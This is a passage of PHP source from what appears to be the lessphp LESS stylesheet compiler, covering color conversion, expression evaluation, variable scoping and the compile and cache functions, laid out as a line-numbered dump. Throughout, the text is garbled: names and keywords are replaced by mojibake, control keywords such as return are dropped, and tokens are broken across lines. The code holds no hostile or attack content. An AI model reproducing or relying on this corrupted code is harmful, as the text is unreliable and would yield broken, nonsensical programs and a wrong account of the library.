$lightCŞÜ
 = 
	`¬¿y
('color', 255, 255, 255);

1244 
$th»shŞd
 = 0.43;

1246 iàĞ
$¬gs
[0] == 'list' ) {

1247 
$šputCŞÜ
 = ( 
	`is£t
(
$¬gs
[2][0]èè? 
$this
->
	`as£¹CŞÜ
($¬gs[2][0]è: 
$lightCŞÜ
;

1248 
$d¬kCŞÜ
 = ( 
	`is£t
(
$¬gs
[2][1]èè? 
$this
->
	`as£¹CŞÜ
($args[2][1]) : $darkColor;

1249 
$lightCŞÜ
 = ( 
	`is£t
(
$¬gs
[2][2]èè? 
$this
->
	`as£¹CŞÜ
($args[2][2]) : $lightColor;

1250 
$th»shŞd
 = ( 
	`is£t
(
$¬gs
[2][3]èè? 
$this
->
	`as£¹Numb”
($args[2][3]) : $threshold;

1253 
$šputCŞÜ
 = 
$this
->
	`as£¹CŞÜ
(
$¬gs
);

1256 
$šputCŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($inputColor);

1257 
$d¬kCŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($darkColor);

1258 
$lightCŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($lightColor);

1261 iàĞ
$this
->
	`lib_luma
(
$d¬kCŞÜ
è> $this->lib_luma(
$lightCŞÜ
) ) {

1262 
$t
 = 
$lightCŞÜ
;

1263 
$lightCŞÜ
 = 
$d¬kCŞÜ
;

1264 
$d¬kCŞÜ
 = 
$t
;

1267 
$šputCŞÜ_®pha
 = 
$this
->
	`lib_®pha
(
$šputCŞÜ
);

1268 iàĞĞ
$this
->
	`lib_luma
(
$šputCŞÜ
è* 
$šputCŞÜ_®pha
è< 
$th»shŞd
) {

1269  
$lightCŞÜ
;

1271  
$d¬kCŞÜ
;

1272 
	}
}

1274 
´Ùeùed
 
funùiÚ
 
	$lib_luma
(
$cŞÜ
) {

1275 
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($color);

1276  (0.2126 * 
$cŞÜ
[0] / 255) + (0.7152 * $color[1] / 255) + (0.0722 * $color[2] / 255);

1277 
	}
}

1280 
public
 
funùiÚ
 
as£¹CŞÜ
(
$v®ue
, 
$”rÜ
 = "expected color value") {

1281 
$cŞÜ
 = 
$this
->
cÛrûCŞÜ
(
$v®ue
);

1282 ià(
is_nuÎ
(
$cŞÜ
)è
	g$this
->
throwE¼Ü
(
$”rÜ
);

1283  
	g$cŞÜ
;

1286 
public
 
funùiÚ
 
as£¹Numb”
(
$v®ue
, 
$”rÜ
 = "expecting‚umber") {

1287 ià(
$v®ue
[0] == "number")  $value[1];

1288 
	g$this
->
throwE¼Ü
(
$”rÜ
);

1291 
public
 
funùiÚ
 
as£¹Args
(
$v®ue
, 
$ex³ùedArgs
, 
$Çme
="") {

1292 ià(
$ex³ùedArgs
 == 1) {

1293  
$v®ue
;

1295 ià(
	g$v®ue
[0] !=ğ"li¡" || 
$v®ue
[1] !ğ","è
$this
->
throwE¼Ü
("expecting†ist");

1296 
	g$v®ues
 = 
$v®ue
[2];

1297 
	g$numV®ues
 = 
couÁ
(
$v®ues
);

1298 ià(
	g$ex³ùedArgs
 !ğ
$numV®ues
) {

1299 ià(
$Çme
) {

1300 
$Çme
 = $name . ": ";

1303 
	g$this
->
throwE¼Ü
("${name}expecting $expectedArgs‡rguments, got $numValues");

1306  
	g$v®ues
;

1310 
´Ùeùed
 
funùiÚ
 
	$toHSL
(
$cŞÜ
) {

1311 ià(
$cŞÜ
[0] == 'hsl')  $color;

1313 
$r
 = 
$cŞÜ
[1] / 255;

1314 
$g
 = 
$cŞÜ
[2] / 255;

1315 
$b
 = 
$cŞÜ
[3] / 255;

1317 
$mš
 = 
	`mš
(
$r
, 
$g
, 
$b
);

1318 
$max
 = 
	`max
(
$r
, 
$g
, 
$b
);

1320 
$L
 = (
$mš
 + 
$max
) / 2;

1321 ià(
$mš
 =ğ
$max
) {

1322 
$S
 = 
$H
 = 0;

1324 ià(
$L
 < 0.5)

1325 
$S
 = (
$max
 - 
$mš
)/($max + $min);

1327 
$S
 = (
$max
 - 
$mš
)/(2.0 - $max - $min);

1329 ià(
$r
 =ğ
$max
è
$H
 = (
$g
 - 
$b
)/($max - 
$mš
);

1330 
	`–£if
 (
$g
 =ğ
$max
è
$H
 = 2.0 + (
$b
 - 
$r
)/($max - 
$mš
);

1331 
	`–£if
 (
$b
 =ğ
$max
è
$H
 = 4.0 + (
$r
 - 
$g
)/($max - 
$mš
);

1335 
$out
 = 
	`¬¿y
('hsl',

1336 (
$H
 < 0 ? $H + 6 : $H)*60,

1337 
$S
*100,

1338 
$L
*100,

1341 ià(
	`couÁ
(
$cŞÜ
è> 4è
$out
[] = $color[4];

1342  
$out
;

1343 
	}
}

1345 
´Ùeùed
 
funùiÚ
 
	$toRGB_h–³r
(
$comp
, 
$‹mp1
, 
$‹mp2
) {

1346 ià(
$comp
 < 0) $comp += 1.0;

1347 
	`–£if
 (
$comp
 > 1) $comp -= 1.0;

1349 ià(6 * 
$comp
 < 1è 
$‹mp1
 + (
$‹mp2
 - $temp1) * 6 * $comp;

1350 ià(2 * 
$comp
 < 1è 
$‹mp2
;

1351 ià(3 * 
$comp
 < 2è 
$‹mp1
 + (
$‹mp2
 - $temp1)*((2/3) - $comp) * 6;

1353  
$‹mp1
;

1354 
	}
}

1360 
´Ùeùed
 
funùiÚ
 
	$toRGB
(
$cŞÜ
) {

1361 ià(
$cŞÜ
[0] == 'color')  $color;

1363 
$H
 = 
$cŞÜ
[1] / 360;

1364 
$S
 = 
$cŞÜ
[2] / 100;

1365 
$L
 = 
$cŞÜ
[3] / 100;

1367 ià(
$S
 == 0) {

1368 
$r
 = 
$g
 = 
$b
 = 
$L
;

1370 
$‹mp2
 = 
$L
 < 0.5 ?

1371 
$L
*(1.0 + 
$S
) :

1372 
$L
 + 
$S
 - $L * $S;

1374 
$‹mp1
 = 2.0 * 
$L
 - 
$‹mp2
;

1376 
$r
 = 
$this
->
	`toRGB_h–³r
(
$H
 + 1/3, 
$‹mp1
, 
$‹mp2
);

1377 
$g
 = 
$this
->
	`toRGB_h–³r
(
$H
, 
$‹mp1
, 
$‹mp2
);

1378 
$b
 = 
$this
->
	`toRGB_h–³r
(
$H
 - 1/3, 
$‹mp1
, 
$‹mp2
);

1382 
$out
 = 
	`¬¿y
('cŞÜ', 
$r
*255, 
$g
*255, 
$b
*255);

1383 ià(
	`couÁ
(
$cŞÜ
è> 4è
$out
[] = $color[4];

1384  
$out
;

1385 
	}
}

1387 
´Ùeùed
 
funùiÚ
 
	$şamp
(
$v
, 
$max
 = 1, 
$mš
 = 0) {

1388  
	`mš
(
$max
, 
	`max
(
$mš
, 
$v
));

1389 
	}
}

1395 
´Ùeùed
 
funùiÚ
 
	$funcToCŞÜ
(
$func
) {

1396 
$âame
 = 
$func
[1];

1397 ià(
$func
[2][0] !ğ'li¡'è 
çl£
;

1398 
$¿wCompÚ’ts
 = 
$func
[2][2];

1400 ià(
$âame
 == 'hsl' || $fname == 'hsla') {

1401 
$h¦
 = 
	`¬¿y
('hsl');

1402 
$i
 = 0;

1403 
	`fÜ—ch
 (
$¿wCompÚ’ts
 
as
 
$c
) {

1404 
$v®
 = 
$this
->
	`»duû
(
$c
);

1405 
$v®
 = 
	`is£t
($v®[1]è? 
	`æßtv®
($val[1]) : 0;

1407 ià(
$i
 =ğ0è
$şamp
 = 360;

1408 
	`–£if
 (
$i
 < 3è
$şamp
 = 100;

1409 
$şamp
 = 1;

1411 
$h¦
[] = 
$this
->
	`şamp
(
$v®
, 
$şamp
);

1412 
$i
++;

1415 
	`couÁ
(
$h¦
) < 4) $hsl[] = 0;

1416  
$this
->
	`toRGB
(
$h¦
);

1418 } 
	`–£if
 (
$âame
 == 'rgb' || $fname == 'rgba') {

1419 
$compÚ’ts
 = 
	`¬¿y
();

1420 
$i
 = 1;

1421 
	`fÜ—ch
 (
$¿wCompÚ’ts
 
as
 
$c
) {

1422 
$c
 = 
$this
->
	`»duû
($c);

1423 ià(
$i
 < 4) {

1424 ià(
$c
[0] == "number" && $c[2] == "%") {

1425 
$compÚ’ts
[] = 255 * (
$c
[1] / 100);

1427 
$compÚ’ts
[] = 
	`æßtv®
(
$c
[1]);

1429 } 
	`–£if
 (
$i
 == 4) {

1430 ià(
$c
[0] == "number" && $c[2] == "%") {

1431 
$compÚ’ts
[] = 1.0 * (
$c
[1] / 100);

1433 
$compÚ’ts
[] = 
	`æßtv®
(
$c
[1]);

1437 
$i
++;

1439 
	`couÁ
(
$compÚ’ts
) < 3) $components[] = 0;

1440 
	`¬¿y_unshiá
(
$compÚ’ts
, 'color');

1441  
$this
->
	`fixCŞÜ
(
$compÚ’ts
);

1444  
çl£
;

1445 
	}
}

1447 
´Ùeùed
 
funùiÚ
 
	$»duû
(
$v®ue
, 
$fÜEx´essiÚ
 = 
çl£
) {

1448 
$v®ue
[0]) {

1450 
$»duûd
 = 
$this
->
	`»duû
(
$v®ue
[1]);

1451 
$v¬
 = 
$this
->
	`compeV®ue
(
$»duûd
);

1452 
$»s
 = 
$this
->
	`»duû
(
	`¬¿y
("v¬ŸbË", $this->
vP»fix
 . 
$v¬
));

1454 ià(
$»s
[0] == "raw_color") {

1455 
$»s
 = 
$this
->
	`cÛrûCŞÜ
($res);

1458 ià(
	`em±y
(
$v®ue
[2])è
$»s
 = 
$this
->
	`lib_e
($res);

1460  
$»s
;

1462 
$key
 = 
$v®ue
[1];

1463 ià(
	`is_¬¿y
(
$key
)) {

1464 
$key
 = 
$this
->
	`»duû
($key);

1465 
$key
 = 
$this
->
vP»fix
 . $this->
	`compeV®ue
($this->
	`lib_e
($key));

1468 
$£’
 =& 
$this
->
’v
->
£’Names
;

1470 ià(!
	`em±y
(
$£’
[
$key
])) {

1471 
$this
->
	`throwE¼Ü
("infinite†oop detected: $key");

1474 
$£’
[
$key
] = 
Œue
;

1475 
$out
 = 
$this
->
	`»duû
($this->
	`g‘
(
$key
));

1476 
$£’
[
$key
] = 
çl£
;

1477  
$out
;

1479 
	`fÜ—ch
 (
$v®ue
[2] 
as
 &
$™em
) {

1480 
$™em
 = 
$this
->
	`»duû
($™em, 
$fÜEx´essiÚ
);

1482  
$v®ue
;

1484  
$this
->
	`ev®u©e
(
$v®ue
);

1486 
	`fÜ—ch
 (
$v®ue
[2] 
as
 &
$·¹
) {

1487 ià(
	`is_¬¿y
(
$·¹
)) {

1488 
$¡r
 = 
$·¹
[0] == "variable";

1489 
$·¹
 = 
$this
->
	`»duû
($part);

1490 ià(
$¡r
è
$·¹
 = 
$this
->
	`lib_e
($part);

1493  
$v®ue
;

1495 
	`li¡
(,
$šÃr
èğ
$v®ue
;

1496  
$this
->
	`lib_e
($this->
	`»duû
(
$šÃr
));

1498 
$cŞÜ
 = 
$this
->
	`funcToCŞÜ
(
$v®ue
);

1499 ià(
$cŞÜ
)  $color;

1501 
	`li¡
(, 
$Çme
, 
$¬gs
èğ
$v®ue
;

1502 ià(
$Çme
 == "%") $name = "_sprintf";

1504 
$f
 = 
	`is£t
(
$this
->
libFunùiÚs
[
$Çme
]) ?

1505 
$this
->
libFunùiÚs
[
$Çme
] : 
	`¬¿y
($this, 'lib_'.
	`¡r_»¶aû
('-', '_', $name));

1507 ià(
	`is_ÿÎabË
(
$f
)) {

1508 ià(
$¬gs
[0] == 'list')

1509 
$¬gs
 = 
£lf
::
	`com´essLi¡
($args[2], $args[1]);

1511 
$»t
 = 
	`ÿÎ_u£r_func
(
$f
, 
$this
->
	`»duû
(
$¬gs
, 
Œue
), $this);

1513 ià(
	`is_nuÎ
(
$»t
)) {

1514  
	`¬¿y
("string", "",‡rray(

1515 
$Çme
, "(", 
$¬gs
, ")"

1520 ià(
	`is_num”ic
(
$»t
)è$»ˆğ
	`¬¿y
('number', $ret, "");

1521 
	`–£if
 (!
	`is_¬¿y
(
$»t
)è$»ˆğ
	`¬¿y
('keyword', $ret);

1523  
$»t
;

1527 
$v®ue
[2] = 
$this
->
	`»duû
($value[2]);

1528  
$v®ue
;

1530 
	`li¡
(, 
$İ
, 
$exp
èğ
$v®ue
;

1531 
$exp
 = 
$this
->
	`»duû
($exp);

1533 ià(
$exp
[0] == "number") {

1534 
$İ
) {

1536  
$exp
;

1538 
$exp
[1] *= -1;

1539  
$exp
;

1542  
	`¬¿y
("¡ršg", "",‡¼ay(
$İ
, 
$exp
));

1545 ià(
$fÜEx´essiÚ
) {

1546 
$v®ue
[0]) {

1548 ià(
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
(
$v®ue
)) {

1549  
$cŞÜ
;

1553  
$this
->
	`cÛrûCŞÜ
(
$v®ue
);

1557  
$v®ue
;

1558 
	}
}

1562 
´Ùeùed
 
funùiÚ
 
	$cÛrûCŞÜ
(
$v®ue
) {

1563 
$v®ue
[0]) {

1564 'cŞÜ':  
$v®ue
;

1566 
$c
 = 
	`¬¿y
("color", 0, 0, 0);

1567 
$cŞÜSŒ
 = 
	`sub¡r
(
$v®ue
[1], 1);

1568 
$num
 = 
	`hexdec
(
$cŞÜSŒ
);

1569 
$width
 = 
	`¡¾’
(
$cŞÜSŒ
) == 3 ? 16 : 256;

1571 
$i
 = 3; $i > 0; $i--) {

1572 
$t
 = 
$num
 % 
$width
;

1573 
$num
 /ğ
$width
;

1575 
$c
[
$i
] = 
$t
 * (256/
$width
è+ $ˆ* 
	`æoÜ
(16/$width);

1578  
$c
;

1580 
$Çme
 = 
$v®ue
[1];

1581 ià(
	`is£t
(
£lf
::
$cssCŞÜs
[
$Çme
])) {

1582 
$rgba
 = 
	`ex¶ode
(',', 
£lf
::
$cssCŞÜs
[
$Çme
]);

1584 if(
	`is£t
(
$rgba
[3]))

1585  
	`¬¿y
('cŞÜ', 
$rgba
[0], $rgba[1], $rgba[2], $rgba[3]);

1587  
	`¬¿y
('cŞÜ', 
$rgba
[0], $rgba[1], $rgba[2]);

1589  
nuÎ
;

1591 
	}
}

1594 
´Ùeùed
 
funùiÚ
 
	$cÛrûSŒšg
(
$v®ue
) {

1595 
$v®ue
[0]) {

1597  
$v®ue
;

1599  
	`¬¿y
("¡ršg", "",‡¼ay(
$v®ue
[1]));

1601  
nuÎ
;

1602 
	}
}

1605 
´Ùeùed
 
funùiÚ
 
	$æ©‹nLi¡
(
$v®ue
) {

1606 ià(
$v®ue
[0] =ğ"li¡" && 
	`couÁ
($value[2]) == 1) {

1607  
$this
->
	`æ©‹nLi¡
(
$v®ue
[2][0]);

1609  
$v®ue
;

1610 
	}
}

1612 
public
 
funùiÚ
 
	$toBoŞ
(
$a
) {

1613 ià(
$a
è 
£lf
::
$TRUE
;

1614  
£lf
::
$FALSE
;

1615 
	}
}

1618 
´Ùeùed
 
funùiÚ
 
	$ev®u©e
(
$exp
) {

1619 
	`li¡
(, 
$İ
, 
$Ëá
, 
$right
, 
$wh™eBefÜe
, 
$wh™eAá”
èğ
$exp
;

1621 
$Ëá
 = 
$this
->
	`»duû
($Ëá, 
Œue
);

1622 
$right
 = 
$this
->
	`»duû
($right, 
Œue
);

1624 ià(
$ËáCŞÜ
 = 
$this
->
	`cÛrûCŞÜ
(
$Ëá
)) {

1625 
$Ëá
 = 
$ËáCŞÜ
;

1628 ià(
$rightCŞÜ
 = 
$this
->
	`cÛrûCŞÜ
(
$right
)) {

1629 
$right
 = 
$rightCŞÜ
;

1632 
$Éy³
 = 
$Ëá
[0];

1633 
$¹y³
 = 
$right
[0];

1636 ià(
$İ
 == "and") {

1637  
$this
->
	`toBoŞ
(
$Ëá
 =ğ
£lf
::
$TRUE
 && 
$right
 == self::$TRUE);

1640 ià(
$İ
 == "=") {

1641  
$this
->
	`toBoŞ
($this->
	`eq
(
$Ëá
, 
$right
) );

1644 ià(
$İ
 =ğ"+" && !
	`is_nuÎ
(
$¡r
 = 
$this
->
	`¡ršgCÚÿ‹Ç‹
(
$Ëá
, 
$right
))) {

1645  
$¡r
;

1649 
$âame
 = "op_${ltype}_${rtype}";

1650 ià(
	`is_ÿÎabË
(
	`¬¿y
(
$this
, 
$âame
))) {

1651 
$out
 = 
$this
->
	`$âame
(
$İ
, 
$Ëá
, 
$right
);

1652 ià(!
	`is_nuÎ
(
$out
))  $out;

1656 
$·ddedOp
 = 
$İ
;

1657 ià(
$wh™eBefÜe
è
$·ddedOp
 = " " . $paddedOp;

1658 ià(
$wh™eAá”
è
$·ddedOp
 .= " ";

1660  
	`¬¿y
("¡ršg", "",‡¼ay(
$Ëá
, 
$·ddedOp
, 
$right
));

1661 
	}
}

1663 
´Ùeùed
 
funùiÚ
 
	$¡ršgCÚÿ‹Ç‹
(
$Ëá
, 
$right
) {

1664 ià(
$¡rLeá
 = 
$this
->
	`cÛrûSŒšg
(
$Ëá
)) {

1665 ià(
$right
[0] == "string") {

1666 
$right
[1] = "";

1668 
$¡rLeá
[2][] = 
$right
;

1669  
$¡rLeá
;

1672 ià(
$¡rRight
 = 
$this
->
	`cÛrûSŒšg
(
$right
)) {

1673 
	`¬¿y_unshiá
(
$¡rRight
[2], 
$Ëá
);

1674  
$¡rRight
;

1676 
	}
}

1680 
´Ùeùed
 
funùiÚ
 
	$fixCŞÜ
(
$c
) {

1681 
	`fÜ—ch
 (
	`¿nge
(1, 3è
as
 
$i
) {

1682 ià(
$c
[
$i
] < 0) $c[$i] = 0;

1683 ià(
$c
[
$i
] > 255) $c[$i] = 255;

1686  
$c
;

1687 
	}
}

1689 
´Ùeùed
 
funùiÚ
 
	$İ_numb”_cŞÜ
(
$İ
, 
$lá
, 
$rgt
) {

1690 ià(
$İ
 == '+' || $op == '*') {

1691  
$this
->
	`İ_cŞÜ_numb”
(
$İ
, 
$rgt
, 
$lá
);

1693 
	}
}

1695 
´Ùeùed
 
funùiÚ
 
	$İ_cŞÜ_numb”
(
$İ
, 
$lá
, 
$rgt
) {

1696 ià(
$rgt
[0] == '%') $rgt[1] /= 100;

1698  
$this
->
	`İ_cŞÜ_cŞÜ
(
$İ
, 
$lá
,

1699 
	`¬¿y_fl
(1, 
	`couÁ
(
$lá
è- 1, 
$rgt
[1]));

1700 
	}
}

1702 
´Ùeùed
 
funùiÚ
 
	$İ_cŞÜ_cŞÜ
(
$İ
, 
$Ëá
, 
$right
) {

1703 
$out
 = 
	`¬¿y
('color');

1704 
$max
 = 
	`couÁ
(
$Ëá
è> couÁ(
$right
) ? count($left) : count($right);

1705 
	`fÜ—ch
 (
	`¿nge
(1, 
$max
 - 1è
as
 
$i
) {

1706 
$lv®
 = 
	`is£t
(
$Ëá
[
$i
]) ? $left[$i] : 0;

1707 
$rv®
 = 
	`is£t
(
$right
[
$i
]) ? $right[$i] : 0;

1708 
$İ
) {

1710 
$out
[] = 
$lv®
 + 
$rv®
;

1713 
$out
[] = 
$lv®
 - 
$rv®
;

1716 
$out
[] = 
$lv®
 * 
$rv®
;

1719 
$out
[] = 
$lv®
 % 
$rv®
;

1722 ià(
$rv®
 =ğ0è
$this
->
	`throwE¼Ü
("evaluateƒrror: can't divide by zero");

1723 
$out
[] = 
$lv®
 / 
$rv®
;

1726 
$this
->
	`throwE¼Ü
('ev®u©”rÜ: cŞÜ o°numb” faed oÀİ '.
$İ
);

1729  
$this
->
	`fixCŞÜ
(
$out
);

1730 
	}
}

1732 
funùiÚ
 
	$lib_»d
(
$cŞÜ
){

1733 
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($color);

1734 ià(
	`is_nuÎ
(
$cŞÜ
)) {

1735 
$this
->
	`throwE¼Ü
('colorƒxpected for„ed()');

1738  
$cŞÜ
[1];

1739 
	}
}

1741 
funùiÚ
 
	$lib_g»’
(
$cŞÜ
){

1742 
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($color);

1743 ià(
	`is_nuÎ
(
$cŞÜ
)) {

1744 
$this
->
	`throwE¼Ü
('colorƒxpected for green()');

1747  
$cŞÜ
[2];

1748 
	}
}

1750 
funùiÚ
 
	$lib_blue
(
$cŞÜ
){

1751 
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($color);

1752 ià(
	`is_nuÎ
(
$cŞÜ
)) {

1753 
$this
->
	`throwE¼Ü
('colorƒxpected for blue()');

1756  
$cŞÜ
[3];

1757 
	}
}

1761 
´Ùeùed
 
funùiÚ
 
	$İ_numb”_numb”
(
$İ
, 
$Ëá
, 
$right
) {

1762 
$un™
 = 
	`em±y
(
$Ëá
[2]è? 
$right
[2] : $left[2];

1764 
$v®ue
 = 0;

1765 
$İ
) {

1767 
$v®ue
 = 
$Ëá
[1] + 
$right
[1];

1770 
$v®ue
 = 
$Ëá
[1] * 
$right
[1];

1773 
$v®ue
 = 
$Ëá
[1] - 
$right
[1];

1776 
$v®ue
 = 
$Ëá
[1] % 
$right
[1];

1779 ià(
$right
[1] =ğ0è
$this
->
	`throwE¼Ü
('parseƒrror: divide by zero');

1780 
$v®ue
 = 
$Ëá
[1] / 
$right
[1];

1783  
$this
->
	`toBoŞ
(
$Ëá
[1] < 
$right
[1]);

1785  
$this
->
	`toBoŞ
(
$Ëá
[1] > 
$right
[1]);

1787  
$this
->
	`toBoŞ
(
$Ëá
[1] >ğ
$right
[1]);

1789  
$this
->
	`toBoŞ
(
$Ëá
[1] <ğ
$right
[1]);

1791 
$this
->
	`throwE¼Ü
('·r£ƒ¼Ü: unknowÀnumb” o³¿tÜ: '.
$İ
);

1794  
	`¬¿y
("numb”", 
$v®ue
, 
$un™
);

1795 
	}
}

1800 
´Ùeùed
 
funùiÚ
 
	$makeOuutBlock
(
$ty³
, 
$£ËùÜs
 = 
nuÎ
) {

1801 
$b
 = 
Ãw
 
¡dşass
;

1802 
$b
->
lšes
 = 
	`¬¿y
();

1803 
$b
->
chd»n
 = 
	`¬¿y
();

1804 
$b
->
£ËùÜs
 = 
$£ËùÜs
;

1805 
$b
->
ty³
 = 
$ty³
;

1806 
$b
->
·»Á
 = 
$this
->
scİe
;

1807  
$b
;

1808 
	}
}

1811 
´Ùeùed
 
funùiÚ
 
	$pushEnv
(
$block
 = 
nuÎ
) {

1812 
$e
 = 
Ãw
 
¡dşass
;

1813 
$e
->
·»Á
 = 
$this
->
’v
;

1814 
$e
->
¡Üe
 = 
	`¬¿y
();

1815 
$e
->
block
 = 
$block
;

1817 
$this
->
’v
 = 
$e
;

1818  
$e
;

1819 
	}
}

1822 
´Ùeùed
 
funùiÚ
 
	$pİEnv
() {

1823 
$Şd
 = 
$this
->
’v
;

1824 
$this
->
’v
 = $this->’v->
·»Á
;

1825  
$Şd
;

1826 
	}
}

1829 
´Ùeùed
 
funùiÚ
 
	$£t
(
$Çme
, 
$v®ue
) {

1830 
$this
->
’v
->
¡Üe
[
$Çme
] = 
$v®ue
;

1831 
	}
}

1835 
´Ùeùed
 
funùiÚ
 
	$g‘
(
$Çme
) {

1836 
$cu¼’t
 = 
$this
->
’v
;

1838 
$isArgum’ts
 = 
$Çme
 =ğ
$this
->
vP»fix
 . 'arguments';

1839 
$cu¼’t
) {

1840 ià(
$isArgum’ts
 && 
	`is£t
(
$cu¼’t
->
¬gum’ts
)) {

1841  
	`¬¿y
('li¡', ' ', 
$cu¼’t
->
¬gum’ts
);

1844 ià(
	`is£t
(
$cu¼’t
->
¡Üe
[
$Çme
]))

1845  
$cu¼’t
->
¡Üe
[
$Çme
];

1847 
$cu¼’t
 = 
	`is£t
($cu¼’t->
¡ÜeP¬’t
) ?

1848 
$cu¼’t
->
¡ÜeP¬’t
 : $cu¼’t->
·»Á
;

1852 
$this
->
	`throwE¼Ü
("variable $name is undefined");

1853 
	}
}

1856 
´Ùeùed
 
funùiÚ
 
	$šjeùV¬ŸbËs
(
$¬gs
) {

1857 
$this
->
	`pushEnv
();

1858 
$·r£r
 = 
Ãw
 
	`Ëssc_·r£r
(
$this
, 
__METHOD__
);

1859 
	`fÜ—ch
 (
$¬gs
 
as
 
$Çme
 => 
$¡rV®ue
) {

1860 ià(
$Çme
{0} != '@') $name = '@'.$name;

1861 
$·r£r
->
couÁ
 = 0;

1862 
$·r£r
->
bufãr
 = (
¡ršg
)
$¡rV®ue
;

1863 ià(!
$·r£r
->
	`´İ”tyV®ue
(
$v®ue
)) {

1864 
throw
 
Ãw
 
	`Exû±iÚ
("failedo…arse…assed in variable $name: $strValue");

1867 
$this
->
	`£t
(
$Çme
, 
$v®ue
);

1869 
	}
}

1875 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$âame
 = 
nuÎ
) {

1876 ià(
$âame
 !=ğ
nuÎ
) {

1878 
$this
->
_·r£Fe
 = 
$âame
;

1880 
	}
}

1882 
public
 
funùiÚ
 
	$compe
(
$¡ršg
, 
$Çme
 = 
nuÎ
) {

1883 
$loÿË
 = 
	`£oÿË
(
LC_NUMERIC
, 0);

1884 
	`£oÿË
(
LC_NUMERIC
, "C");

1886 
$this
->
·r£r
 = $this->
	`makeP¬£r
(
$Çme
);

1887 
$roÙ
 = 
$this
->
·r£r
->
	`·r£
(
$¡ršg
);

1889 
$this
->
’v
 = 
nuÎ
;

1890 
$this
->
scİe
 = 
nuÎ
;

1892 
$this
->
fÜm©‹r
 = $this->
	`ÃwFÜm©‹r
();

1894 ià(!
	`em±y
(
$this
->
»gi¡”edV¬s
)) {

1895 
$this
->
	`šjeùV¬ŸbËs
($this->
»gi¡”edV¬s
);

1898 
$this
->
sourûP¬£r
 = $this->
·r£r
;

1899 
$this
->
	`compeBlock
(
$roÙ
);

1901 
	`ob_¡¬t
();

1902 
$this
->
fÜm©‹r
->
	`block
($this->
scİe
);

1903 
$out
 = 
	`ob_g‘_ş—n
();

1904 
	`£oÿË
(
LC_NUMERIC
, 
$loÿË
);

1905  
$out
;

1906 
	}
}

1908 
public
 
funùiÚ
 
	$compeFe
(
$âame
, 
$outFÇme
 = 
nuÎ
) {

1909 ià(!
	`is_»adabË
(
$âame
)) {

1910 
throw
 
Ãw
 
	`Exû±iÚ
('lßdƒ¼Ü: faedØfšd '.
$âame
);

1913 
$pi
 = 
	`·thšfo
(
$âame
);

1915 
$ŞdImpÜt
 = 
$this
->
impÜtDœ
;

1917 
$this
->
impÜtDœ
 = (
¬¿y
)$this->importDir;

1918 
$this
->
impÜtDœ
[] = 
$pi
['dirname'].'/';

1920 
$this
->
	`addP¬£dFe
(
$âame
);

1922 
$out
 = 
$this
->
	`compe
(
	`fe_g‘_cÚ‹Ás
(
$âame
), $fname);

1924 
$this
->
impÜtDœ
 = 
$ŞdImpÜt
;

1926 ià(
$outFÇme
 !=ğ
nuÎ
) {

1927  
	`fe_put_cÚ‹Ás
(
$outFÇme
, 
$out
);

1930  
$out
;

1931 
	}
}

1934 
public
 
funùiÚ
 
	$checkedCompe
(
$š
, 
$out
) {

1935 ià(!
	`is_fe
(
$out
è|| 
	`femtime
(
$š
) > filemtime($out)) {

1936 
$this
->
	`compeFe
(
$š
, 
$out
);

1937  
Œue
;

1939  
çl£
;

1940 
	}
}

1962 
public
 
funùiÚ
 
	$ÿchedCompe
(
$š
, 
$fÜû
 = 
çl£
) {

1964 
$roÙ
 = 
nuÎ
;

1966 ià(
	`is_¡ršg
(
$š
)) {

1967 
$roÙ
 = 
$š
;

1968 } 
	`–£if
 (
	`is_¬¿y
(
$š
è
ªd
 
	`is£t
($in['root'])) {

1969 ià(
$fÜû
 
Ü
 ! 
	`is£t
(
$š
['files'])) {

1973 
$roÙ
 = 
$š
['root'];

1974 } 
	`–£if
 (
	`is£t
(
$š
['fes']è
ªd
 
	`is_¬¿y
($in['files'])) {

1975 
	`fÜ—ch
 (
$š
['fes'] 
as
 
$âame
 => 
$áime
 ) {

1976 ià(!
	`fe_exi¡s
(
$âame
è
Ü
 
	`femtime
($âameè> 
$áime
) {

1979 
$roÙ
 = 
$š
['root'];

1987  
nuÎ
;

1990 ià(
$roÙ
 !=ğ
nuÎ
) {

1992 
$out
 = 
	`¬¿y
();

1993 
$out
['roÙ'] = 
$roÙ
;

1994 
$out
['comped'] = 
$this
->
	`compeFe
(
$roÙ
);

1995 
$out
['fes'] = 
$this
->
	`®lP¬£dFes
();

1996 
$out
['upd©ed'] = 
	`time
();

1997  
$out
;

2001  
$š
;

2004 
	}
}

2008 
public
 
funùiÚ
 
	$·r£
(
$¡r
 = 
nuÎ
, 
$š™ŸlV¬ŸbËs
 =‚ull) {

2009 ià(
	`is_¬¿y
(
$¡r
)) {

2010 
$š™ŸlV¬ŸbËs
 = 
$¡r
;

2011 
$¡r
 = 
nuÎ
;

2014 
$ŞdV¬s
 = 
$this
->
»gi¡”edV¬s
;

2015 ià(
$š™ŸlV¬ŸbËs
 !=ğ
nuÎ
) {

2016 
$this
->
	`£tV¬ŸbËs
(
$š™ŸlV¬ŸbËs
);

2019 ià(
$¡r
 =ğ
nuÎ
) {

2020 ià(
	`em±y
(
$this
->
_·r£Fe
)) {

2021 
throw
 
Ãw
 
	`exû±iÚ
("nothingo…arse");

2024 
$out
 = 
$this
->
	`compeFe
($this->
_·r£Fe
);

2026 
$out
 = 
$this
->
	`compe
(
$¡r
);

2029 
$this
->
»gi¡”edV¬s
 = 
$ŞdV¬s
;

2030  
$out
;

2031 
	}
}

2033 
´Ùeùed
 
funùiÚ
 
	$makeP¬£r
(
$Çme
) {

2034 
$·r£r
 = 
Ãw
 
	`Ëssc_·r£r
(
$this
, 
$Çme
);

2035 
$·r£r
->
wr™eComm’ts
 = 
$this
->
´e£rveComm’ts
;

2037  
$·r£r
;

2038 
	}
}

2040 
public
 
funùiÚ
 
	$£tFÜm©‹r
(
$Çme
) {

2041 
$this
->
fÜm©‹rName
 = 
$Çme
;

2042 
	}
}

2044 
´Ùeùed
 
funùiÚ
 
	$ÃwFÜm©‹r
() {

2045 
$şassName
 = "lessc_formatter_lessjs";

2046 ià(!
	`em±y
(
$this
->
fÜm©‹rName
)) {

2047 ià(!
